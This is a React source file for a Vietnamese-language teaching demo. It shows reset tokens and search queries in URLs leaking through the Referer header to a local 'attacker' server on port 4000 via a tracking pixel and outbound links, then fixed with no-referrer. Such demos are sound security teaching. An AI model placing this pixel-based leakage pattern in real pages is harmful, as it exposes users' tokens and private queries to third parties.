import React, { useEffect, useMemo, useState } from 'react'

const API_BASE = import.meta.env.VITE_API_BASE || ''

const API = {
  getPolicy: async () => (await fetch(`${API_BASE}/api/policy`)).json(),
  setPolicy: async (fixActive) => (
    await fetch(`${API_BASE}/api/policy`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ fixActive }) })
  ).json(),
  getLogs: async () => (await fetch(`${API_BASE}/api/logs`)).json(),
}

function usePolicy() {
  const [fixActive, setFixActive] = useState(false)
  const refresh = async () => {
    try {
      const d = await API.getPolicy()
      setFixActive(Boolean(d.fixActive))
    } catch {}
  }
  useEffect(() => { refresh() }, [])
  const toggle = async () => {
    const next = !fixActive
    try { await API.setPolicy(next) } catch (_) { /* dev mode without backend proxy */ }
    setFixActive(next)
  }
  return { fixActive, toggle, refresh }
}

function LogsPanel({ refreshKey }) {
  const [items, setItems] = useState([])
  const load = async () => {
    const d = await API.getLogs()
    setItems(d.items || [])
  }
  useEffect(() => { load() }, [refreshKey])
  return (
    <div className="card stack-8">
      <div className="row" style={{justifyContent:'space-between'}}>
        <div>
          <h3 className="section-title">Attacker Console</h3>
          <div className="muted">Hiển thị 200 request mới nhất được attacker server (cổng 4000) ghi lại.</div>
        </div>
        <button className="btn btn-ghost" onClick={load}>Refresh</button>
      </div>
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>Path</th>
            <th>Referer</th>
          </tr>
        </thead>
        <tbody>
          {items.map((x) => (
            <tr key={x._id}>
              <td>{new Date(x.createdAt).toLocaleString()}</td>
              <td>{x.url}</td>
              <td style={{maxWidth: 520, wordBreak:'break-all'}}>
                <code>{x.referer || '(none)'}</code>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

function Switch({ on, onToggle }){
  return (
    <button aria-label="toggle fix" className={`switch ${on? 'on':''}`} onClick={onToggle}>
      <span className="switch-handle" />
    </button>
  )
}

export default function App() {
  const { fixActive, toggle } = usePolicy()
  const [token, setToken] = useState('abc123')
  const [query, setQuery] = useState('quẻy_nhay_cam')
  const [refreshKey, bump] = useState(0)
  const [pixelNonce, setPixelNonce] = useState(0)

  const currentUrlWithToken = useMemo(() => {
    const url = new URL(window.location.href)
    url.searchParams.set('token', token)
    return url.toString()
  }, [token])

  const applyUrlWithToken = () => {
    // Cập nhật URL của tài liệu để Referer chứa ?token=...
    window.history.replaceState({}, '', currentUrlWithToken)
    // Buộc tải lại pixel để gửi request mới với Referer đã cập nhật
    setPixelNonce((n) => n + 1)
    // Làm mới bảng log để dễ thấy bản ghi mới
    bump((k) => k + 1)
  }

  const attackerPixelBase = `http://localhost:4000/collect.gif?from=img` // another origin
  const attackerLanding = 'http://localhost:4000/landing'

  return (
    <div className="container stack-12">
      <header className="header">
        <div>
          <h1 className="title">Referrer Policy & Privacy Demo</h1>
          <p className="subtitle">Minh hoạ rò rỉ query params qua HTTP Referer và fix bằng <code>Referrer-Policy: no-referrer</code>.</p>
        </div>
        <div className="row">
          <div className="badge">
            <span className="badge-dot" style={{background: fixActive ? 'var(--success)' : 'var(--danger)'}} />
            Fix mode: {fixActive ? 'ON' : 'OFF'}
          </div>
          <Switch on={fixActive} onToggle={async()=>{ await toggle(); bump(k=>k+1) }} />
        </div>
      </header>

      <section className="grid grid-2">
        <div className="card stack-12">
          <h2 className="section-title">1) Magic link / reset token</h2>
          <div className="muted">Đưa token vào URL hiện tại rồi tải tài nguyên ngoài domain để quan sát Referer.</div>
          <div className="row">
            <label>Token</label>
            <input className="input" value={token} onChange={(e)=>setToken(e.target.value)} />
            <button className="btn btn-ghost" onClick={applyUrlWithToken}>Đưa token vào URL</button>
          </div>
          <div className="grid">
            <div className="stack-8">
              <div className="muted">Ảnh 1x1 từ attacker server:</div>
              {fixActive ? (
                <img key={pixelNonce} src={`${attackerPixelBase}&t=${pixelNonce}`} alt="pixel" referrerPolicy="no-referrer" width={32} height={32} />
              ) : (
                <img key={pixelNonce} src={`${attackerPixelBase}&t=${pixelNonce}`} alt="pixel" width={32} height={32} />
              )}
            </div>
            <div className="stack-8">
              <div className="muted">Đi sang attacker landing:</div>
              {fixActive ? (
                <a className="link" href={attackerLanding} rel="noreferrer" target="_blank">Mở attacker (no-referrer)</a>
              ) : (
                <a className="link" href={attackerLanding} target="_blank">Mở attacker (có thể leak)</a>
              )}
            </div>
          </div>
        </div>

        <div className="card stack-12">
          <h2 className="section-title">2) Tìm kiếm có query nhạy cảm</h2>
          <div className="muted">Đưa <code>q</code> vào URL, sau đó click outbound link.</div>
          <div className="row">
            <label>q</label>
            <input className="input" value={query} onChange={(e)=>setQuery(e.target.value)} />
            <button className="btn btn-ghost" onClick={()=>{
              const u = new URL(window.location.href)
              u.searchParams.set('q', query)
              window.history.replaceState({}, '', u.toString())
            }}>Đưa q vào URL</button>
          </div>
          <div>
            {fixActive ? (
              <a className="link" href={attackerLanding + '?from=search'} rel="noreferrer" target="_blank">Xem thêm (no-referrer)</a>
            ) : (
              <a className="link" href={attackerLanding + '?from=search'} target="_blank">Xem thêm (có thể leak)</a>
            )}
          </div>
        </div>
      </section>

      <section className="card">
        <LogsPanel refreshKey={refreshKey} />
        <div className="muted">Trước fix: Referer sẽ chứa URL đầy đủ (kể cả <code>?token=...</code> / <code>?q=...</code>). Sau fix: Referer trống.</div>
      </section>

      <footer className="footer">Backend: <code>http://localhost:3001</code> · Attacker: <code>http://localhost:4000</code></footer>
    </div>
  )
}
